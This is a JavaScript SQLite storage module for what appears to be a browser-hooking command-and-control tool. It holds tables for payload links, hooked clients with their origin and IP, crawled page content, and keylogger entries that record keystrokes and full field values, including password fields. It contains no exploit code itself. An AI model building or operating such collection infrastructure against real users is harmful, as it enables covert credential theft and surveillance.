import Database from "better-sqlite3";
import path from "node:path";
import fs from "node:fs";

/**
 * Creates and returns the SQLite database layer with prepared statement methods
 * for links, clients, logs, spider_results, and spider_content.
 * @param {string} dbPath - File path for the database, or ":memory:" for in-memory.
 */
export function createDatabase(dbPath) {
  if (dbPath !== ":memory:") {
    const dir = path.dirname(dbPath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
  }

  const db = new Database(dbPath);
  db.pragma("journal_mode = WAL");

  db.exec(`
    CREATE TABLE IF NOT EXISTS links (
      id TEXT PRIMARY KEY,
      created_at TEXT NOT NULL,
      payloads TEXT NOT NULL,
      redirect_uri TEXT
    );

    CREATE TABLE IF NOT EXISTS clients (
      id TEXT PRIMARY KEY,
      link_id TEXT NOT NULL,
      connected_at TEXT NOT NULL,
      payloads TEXT NOT NULL DEFAULT '[]',
      FOREIGN KEY (link_id) REFERENCES links(id)
    );

    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id TEXT NOT NULL,
      level TEXT NOT NULL,
      source TEXT NOT NULL,
      message TEXT NOT NULL,
      timestamp INTEGER NOT NULL
    );

    CREATE INDEX IF NOT EXISTS idx_logs_client ON logs(client_id);
    CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp);

    CREATE TABLE IF NOT EXISTS spider_results (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id TEXT NOT NULL,
      url TEXT NOT NULL,
      status INTEGER NOT NULL,
      depth INTEGER NOT NULL,
      discovered_at INTEGER NOT NULL,
      UNIQUE(client_id, url)
    );

    CREATE INDEX IF NOT EXISTS idx_spider_client ON spider_results(client_id);

    CREATE TABLE IF NOT EXISTS spider_content (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id TEXT NOT NULL,
      url TEXT NOT NULL,
      content_type TEXT NOT NULL DEFAULT '',
      content BLOB NOT NULL,
      size INTEGER NOT NULL,
      fetched_at INTEGER NOT NULL
    );

    CREATE INDEX IF NOT EXISTS idx_spider_content_client ON spider_content(client_id);
    CREATE INDEX IF NOT EXISTS idx_spider_content_client_url ON spider_content(client_id, url);

    CREATE TABLE IF NOT EXISTS keylogger_entries (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id TEXT NOT NULL,
      element_descriptor TEXT NOT NULL,
      element_type TEXT NOT NULL DEFAULT '',
      event_type TEXT NOT NULL,
      data TEXT NOT NULL DEFAULT '',
      value TEXT NOT NULL DEFAULT '',
      timestamp INTEGER NOT NULL
    );

    CREATE INDEX IF NOT EXISTS idx_keylogger_client ON keylogger_entries(client_id);
    CREATE INDEX IF NOT EXISTS idx_keylogger_timestamp ON keylogger_entries(client_id, timestamp);
  `);

  // Idempotent migrations — each ALTER TABLE is wrapped in try/catch because
  // better-sqlite3 throws if the column already exists (no IF NOT EXISTS support).
  // All migrations are safe to run on every startup.
  try {
    db.exec("ALTER TABLE clients ADD COLUMN payloads TEXT NOT NULL DEFAULT '[]'");
  } catch {
    // Column already exists — safe to ignore
  }

  // Migrate: add config column to links
  try {
    db.exec("ALTER TABLE links ADD COLUMN config TEXT NOT NULL DEFAULT '{}'");
  } catch {
    // Column already exists — safe to ignore
  }

  // Migrate: add config column to clients
  try {
    db.exec("ALTER TABLE clients ADD COLUMN config TEXT NOT NULL DEFAULT '{}'");
  } catch {
    // Column already exists — safe to ignore
  }

  // Migrate: add origin and ip columns to clients
  try {
    db.exec("ALTER TABLE clients ADD COLUMN origin TEXT NOT NULL DEFAULT ''");
  } catch {
    // Column already exists — safe to ignore
  }
  try {
    db.exec("ALTER TABLE clients ADD COLUMN ip TEXT NOT NULL DEFAULT ''");
  } catch {
    // Column already exists — safe to ignore
  }

  // Migrate: add disconnected_at column to clients
  try {
    db.exec("ALTER TABLE clients ADD COLUMN disconnected_at TEXT NOT NULL DEFAULT ''");
  } catch {
    // Column already exists — safe to ignore
  }

  // Migrate: add content_type and size columns to spider_results
  try {
    db.exec("ALTER TABLE spider_results ADD COLUMN content_type TEXT NOT NULL DEFAULT ''");
  } catch {
    // Column already exists — safe to ignore
  }
  try {
    db.exec("ALTER TABLE spider_results ADD COLUMN size INTEGER NOT NULL DEFAULT 0");
  } catch {
    // Column already exists — safe to ignore
  }

  // Prepared statements — links
  const insertLinkStmt = db.prepare(
    "INSERT INTO links (id, created_at, payloads, redirect_uri, config) VALUES (?, ?, ?, ?, ?)"
  );
  const getLink = db.prepare("SELECT * FROM links WHERE id = ?");
  const getAllLinks = db.prepare("SELECT * FROM links ORDER BY created_at");
  const updateLinkPayloads = db.prepare(
    "UPDATE links SET payloads = ? WHERE id = ?"
  );
  const updateLinkRedirectUri = db.prepare(
    "UPDATE links SET redirect_uri = ? WHERE id = ?"
  );
  const updateLinkConfigStmt = db.prepare(
    "UPDATE links SET config = ? WHERE id = ?"
  );
  const deleteLinkStmt = db.prepare("DELETE FROM links WHERE id = ?");

  // Prepared statements — clients
  // insertClient uses INSERT OR IGNORE so reconnects don't overwrite the client's persisted payloads
  const insertClientStmt = db.prepare(
    "INSERT OR IGNORE INTO clients (id, link_id, connected_at, payloads, config, origin, ip) VALUES (?, ?, ?, ?, ?, ?, ?)"
  );
  const updateClientConnectedAtStmt = db.prepare(
    "UPDATE clients SET connected_at = ? WHERE id = ?"
  );
  const updateClientOriginIpStmt = db.prepare(
    "UPDATE clients SET origin = ?, ip = ? WHERE id = ?"
  );
  const updateClientDisconnectedAtStmt = db.prepare(
    "UPDATE clients SET disconnected_at = ? WHERE id = ?"
  );
  const updateClientPayloadsStmt = db.prepare(
    "UPDATE clients SET payloads = ? WHERE id = ?"
  );
  const updateClientConfigStmt = db.prepare(
    "UPDATE clients SET config = ? WHERE id = ?"
  );
  const getClient = db.prepare("SELECT * FROM clients WHERE id = ?");
  const getAllClients = db.prepare(
    "SELECT * FROM clients ORDER BY connected_at"
  );
  const deleteClientStmt = db.prepare("DELETE FROM clients WHERE id = ?");

  // Prepared statements — logs
  const insertLog = db.prepare(
    "INSERT INTO logs (client_id, level, source, message, timestamp) VALUES (?, ?, ?, ?, ?)"
  );
  const getClientLogs = db.prepare(
    "SELECT * FROM logs WHERE client_id = ? ORDER BY id ASC LIMIT ?"
  );
  const getGlobalLogs = db.prepare(
    "SELECT * FROM logs ORDER BY id ASC LIMIT ?"
  );
  const deleteLogsByClientStmt = db.prepare(
    "DELETE FROM logs WHERE client_id = ?"
  );

  // Prepared statements — spider_results
  const insertSpiderResultStmt = db.prepare(
    `INSERT OR IGNORE INTO spider_results (client_id, url, status, depth, discovered_at, content_type, size)
     VALUES (?, ?, ?, ?, ?, ?, ?)`
  );
  const getSpiderResults = db.prepare(
    "SELECT * FROM spider_results WHERE client_id = ? ORDER BY id ASC"
  );
  const deleteSpiderResultsByClientStmt = db.prepare(
    "DELETE FROM spider_results WHERE client_id = ?"
  );

  // Prepared statements — spider_content
  const insertSpiderContentStmt = db.prepare(
    `INSERT INTO spider_content (client_id, url, content_type, content, size, fetched_at)
     VALUES (?, ?, ?, ?, ?, ?)`
  );
  const getSpiderContentVersionsStmt = db.prepare(
    `SELECT id, client_id, url, content_type, size, fetched_at
     FROM spider_content WHERE client_id = ? AND url = ? ORDER BY fetched_at DESC`
  );
  const getSpiderContentByIdStmt = db.prepare(
    "SELECT * FROM spider_content WHERE id = ?"
  );
  const getSpiderContentUrlsStmt = db.prepare(
    "SELECT DISTINCT url FROM spider_content WHERE client_id = ?"
  );
  const getSpiderContentByPrefixStmt = db.prepare(
    `SELECT id, client_id, url, content_type, size, fetched_at
     FROM spider_content WHERE client_id = ? AND url LIKE ? ESCAPE '\\'
     ORDER BY url, fetched_at DESC`
  );
  const getSpiderContentLatestStmt = db.prepare(
    `SELECT id FROM spider_content WHERE client_id = ? AND url = ? ORDER BY fetched_at DESC LIMIT 1`
  );
  const deleteSpiderContentByClientStmt = db.prepare(
    "DELETE FROM spider_content WHERE client_id = ?"
  );

  // Prepared statements — keylogger_entries
  const insertKeyloggerEntryStmt = db.prepare(
    `INSERT INTO keylogger_entries (client_id, element_descriptor, element_type, event_type, data, value, timestamp)
     VALUES (?, ?, ?, ?, ?, ?, ?)`
  );
  const getKeyloggerEntriesStmt = db.prepare(
    "SELECT * FROM keylogger_entries WHERE client_id = ? ORDER BY timestamp ASC, id ASC"
  );
  const deleteKeyloggerEntriesByClientStmt = db.prepare(
    "DELETE FROM keylogger_entries WHERE client_id = ?"
  );

  /**
   * Map a raw `links` row to the public link shape.
   * @param {object|undefined} row
   * @returns {object|null}
   */
  function rowToLink(row) {
    if (!row) return null;
    return {
      id: row.id,
      createdAt: new Date(row.created_at),
      payloads: JSON.parse(row.payloads),
      redirectUri: row.redirect_uri || null,
      config: row.config ? JSON.parse(row.config) : {},
    };
  }

  /**
   * Map a raw `clients` row to the public client shape.
   * @param {object|undefined} row
   * @returns {object|null}
   */
  function rowToClient(row) {
    if (!row) return null;
    return {
      id: row.id,
      linkId: row.link_id,
      connectedAt: new Date(row.connected_at),
      disconnectedAt: row.disconnected_at ? new Date(row.disconnected_at) : null,
      payloads: JSON.parse(row.payloads),
      config: row.config ? JSON.parse(row.config) : {},
      origin: row.origin || '',
      ip: row.ip || '',
    };
  }

  /**
   * Map a raw `logs` row to the public log shape.
   * @param {object} row
   * @returns {object}
   */
  function rowToLog(row) {
    return {
      id: row.id,
      clientId: row.client_id,
      level: row.level,
      source: row.source,
      message: row.message,
      timestamp: row.timestamp,
    };
  }

  /**
   * Map a raw `spider_results` row to the public result shape.
   * @param {object} row
   * @returns {object}
   */
  function rowToSpiderResult(row) {
    return {
      url: row.url,
      status: row.status,
      depth: row.depth,
      discoveredAt: row.discovered_at,
      contentType: row.content_type || '',
      size: row.size || 0,
    };
  }

  /**
   * Map a raw `keylogger_entries` row to the public entry shape.
   * @param {object} row
   * @returns {object}
   */
  function rowToKeyloggerEntry(row) {
    return {
      id: row.id,
      elementDescriptor: row.element_descriptor,
      elementType: row.element_type,
      eventType: row.event_type,
      data: row.data,
      value: row.value,
      timestamp: row.timestamp,
    };
  }

  /**
   * Map a raw `spider_content` row (metadata only — no BLOB) to the public version shape.
   * @param {object} row
   * @returns {object}
   */
  function rowToSpiderContentVersion(row) {
    return {
      id: row.id,
      clientId: row.client_id,
      url: row.url,
      contentType: row.content_type,
      size: row.size,
      fetchedAt: row.fetched_at,
    };
  }

  /**
   * Delete all logs, spider results, spider content for a client, then the client record itself.
   * @param {string} clientId
   */
  function deleteClientCascade(clientId) {
    deleteLogsByClientStmt.run(clientId);
    deleteSpiderResultsByClientStmt.run(clientId);
    deleteSpiderContentByClientStmt.run(clientId);
    deleteKeyloggerEntriesByClientStmt.run(clientId);
    deleteClientStmt.run(clientId);
  }

  return {
    /**
     * Insert a new link record.
     * @param {string} id
     * @param {string[]} payloads
     * @param {string|null} redirectUri
     * @param {object} [config] - Optional config object (default {})
     */
    insertLink(id, payloads, redirectUri, config = {}) {
      insertLinkStmt.run(
        id,
        new Date().toISOString(),
        JSON.stringify(payloads),
        redirectUri || null,
        JSON.stringify(config)
      );
    },

    /** Get a single link by ID, or null if not found. */
    getLink(id) {
      return rowToLink(getLink.get(id));
    },

    /** Get all links ordered by creation time. */
    getAllLinks() {
      return getAllLinks.all().map(rowToLink);
    },

    /** Update the payloads array for a link. */
    updateLinkPayloads(id, payloads) {
      updateLinkPayloads.run(JSON.stringify(payloads), id);
    },

    /** Update the redirect URI for a link (null to clear). */
    updateLinkRedirectUri(id, redirectUri) {
      updateLinkRedirectUri.run(redirectUri || null, id);
    },

    /** Update the config object for a link. */
    updateLinkConfig(id, configJson) {
      updateLinkConfigStmt.run(typeof configJson === "string" ? configJson : JSON.stringify(configJson), id);
    },

    /**
     * Delete a link record. Clients that were created from this link are left intact —
     * once connected, a client is independent of its originating link.
     *
     * FK enforcement is momentarily disabled because `clients.link_id` references
     * `links.id` and better-sqlite3 enables FK enforcement by default. The clients
     * intentionally retain their `link_id` as a historical reference.
     */
    deleteLink(id) {
      db.pragma("foreign_keys = OFF");
      try {
        deleteLinkStmt.run(id);
      } finally {
        db.pragma("foreign_keys = ON");
      }
    },

    /**
     * Insert a new client record (INSERT OR IGNORE).
     * On reconnect, this is a no-op — the client's persisted payloads and config are preserved.
     * @param {string} id
     * @param {string} linkId
     * @param {string[]} payloads - Initial payloads copied from the link template.
     * @param {object} [config] - Initial config copied from the link template.
     * @param {string} [origin] - The page origin where the client is running.
     * @param {string} [ip] - The client's remote IP address.
     */
    insertClient(id, linkId, payloads, config = {}, origin = '', ip = '') {
      insertClientStmt.run(
        id,
        linkId,
        new Date().toISOString(),
        JSON.stringify(payloads),
        JSON.stringify(config),
        origin,
        ip
      );
    },

    /** Update only the connected_at timestamp for a client. Called on every connect/reconnect. */
    updateClientConnectedAt(id) {
      updateClientConnectedAtStmt.run(new Date().toISOString(), id);
    },

    /**
     * Update the origin and IP for a client. Called on every connect/reconnect to refresh with
     * the latest values (since IP or origin may change across reconnects).
     * @param {string} id
     * @param {string} origin
     * @param {string} ip
     */
    updateClientOriginIp(id, origin, ip) {
      updateClientOriginIpStmt.run(origin, ip, id);
    },

    /** Update a client's persisted payload list. */
    updateClientPayloads(id, payloads) {
      updateClientPayloadsStmt.run(JSON.stringify(payloads), id);
    },

    /** Update the config object for a client. */
    updateClientConfig(id, configJson) {
      updateClientConfigStmt.run(typeof configJson === "string" ? configJson : JSON.stringify(configJson), id);
    },

    /** Record when a client disconnected. Called from the WS close handler in c2.js. */
    updateClientDisconnectedAt(id) {
      updateClientDisconnectedAtStmt.run(new Date().toISOString(), id);
    },

    /** Get a single client by ID, or null if not found. */
    getClient(id) {
      return rowToClient(getClient.get(id));
    },

    /** Get all clients ordered by connection time. */
    getAllClients() {
      return getAllClients.all().map(rowToClient);
    },

    /**
     * Delete a client and cascade to its logs, spider results, and spider content.
     */
    deleteClient(id) {
      deleteClientCascade(id);
    },

    /** Insert a log entry. */
    insertLog(clientId, level, source, message, timestamp) {
      insertLog.run(clientId, level, source, message, timestamp);
    },

    /** Get the first `limit` log entries for a client (ordered by insertion). */
    getClientLogs(clientId, limit = 200) {
      return getClientLogs.all(clientId, limit).map(rowToLog);
    },

    /** Get the first `limit` global log entries (ordered by insertion). */
    getGlobalLogs(limit = 500) {
      return getGlobalLogs.all(limit).map(rowToLog);
    },

    /**
     * Insert a spider result, ignoring duplicates (deduped by client+url).
     * @param {string} clientId
     * @param {string} url
     * @param {number} status - HTTP status code
     * @param {number} depth - Crawl depth
     * @param {number} discoveredAt - Unix timestamp
     * @param {string} [contentType] - Response content type
     * @param {number} [size] - Response body size in bytes
     */
    insertSpiderResult(clientId, url, status, depth, discoveredAt, contentType = '', size = 0) {
      insertSpiderResultStmt.run(clientId, url, status, depth, discoveredAt, contentType, size);
    },

    /** Get all spider results for a client in discovery order. */
    getSpiderResults(clientId) {
      return getSpiderResults.all(clientId).map(rowToSpiderResult);
    },

    /**
     * Insert a spider content blob (one row per fetch — multiple versions per URL allowed).
     * @param {string} clientId
     * @param {string} url
     * @param {string} contentType
     * @param {Buffer|Uint8Array} content - Raw response body
     * @param {number} size - Body size in bytes
     * @param {number} fetchedAt - Unix timestamp
     */
    insertSpiderContent(clientId, url, contentType, content, size, fetchedAt) {
      insertSpiderContentStmt.run(clientId, url, contentType, content, size, fetchedAt);
    },

    /**
     * List all stored versions for a URL (metadata only, no BLOB), newest first.
     * @param {string} clientId
     * @param {string} url
     * @returns {object[]}
     */
    getSpiderContentVersions(clientId, url) {
      return getSpiderContentVersionsStmt.all(clientId, url).map(rowToSpiderContentVersion);
    },

    /**
     * Get a single spider_content row (including the BLOB) by its primary key ID.
     * @param {number} id
     * @returns {object|null}
     */
    getSpiderContentById(id) {
      return getSpiderContentByIdStmt.get(id) || null;
    },

    /**
     * Get the distinct URLs that have stored content for a client.
     * @param {string} clientId
     * @returns {string[]}
     */
    getSpiderContentUrls(clientId) {
      return getSpiderContentUrlsStmt.all(clientId).map((r) => r.url);
    },

    /**
     * Get all content rows (metadata only, no BLOB) whose URL starts with urlPrefix,
     * ordered by URL then fetched_at DESC (so the first row per URL is the latest version).
     * @param {string} clientId
     * @param {string} urlPrefix
     * @returns {object[]}
     */
    getSpiderContentByPrefix(clientId, urlPrefix) {
      // LIKE uses % as wildcard; escape any literal % or _ in the prefix
      const escaped = urlPrefix.replace(/[%_]/g, "\\$&");
      return getSpiderContentByPrefixStmt.all(clientId, `${escaped}%`).map(rowToSpiderContentVersion);
    },

    /**
     * Get the ID of the latest stored content version for a client + URL.
     * Returns null if no content exists.
     * @param {string} clientId
     * @param {string} url
     * @returns {number|null}
     */
    getSpiderContentLatest(clientId, url) {
      const row = getSpiderContentLatestStmt.get(clientId, url);
      return row ? row.id : null;
    },

    /** Delete all spider_content rows for a client (cascade on client delete). */
    deleteSpiderContentByClient(clientId) {
      deleteSpiderContentByClientStmt.run(clientId);
    },

    /**
     * Insert a keystroke entry for a client.
     * @param {string} clientId
     * @param {string} elementDescriptor - Human-readable element identifier (e.g. "input#username")
     * @param {string} elementType - Input type: "text", "password", "email", "textarea", etc.
     * @param {string} eventType - "input", "key", or "change"
     * @param {string} data - Character typed, key combo, or selected value
     * @param {string} value - Full field value after this event
     * @param {number} timestamp - Unix timestamp in milliseconds
     */
    insertKeyloggerEntry(clientId, elementDescriptor, elementType, eventType, data, value, timestamp) {
      insertKeyloggerEntryStmt.run(clientId, elementDescriptor, elementType, eventType, data, value, timestamp);
    },

    /** Get all keylogger entries for a client in timestamp order. */
    getKeyloggerEntries(clientId) {
      return getKeyloggerEntriesStmt.all(clientId).map(rowToKeyloggerEntry);
    },

    /** Delete all keylogger entries for a client. */
    clearKeyloggerEntries(clientId) {
      deleteKeyloggerEntriesByClientStmt.run(clientId);
    },

    /** Close the database connection. */
    close() {
      db.close();
    },
  };
}
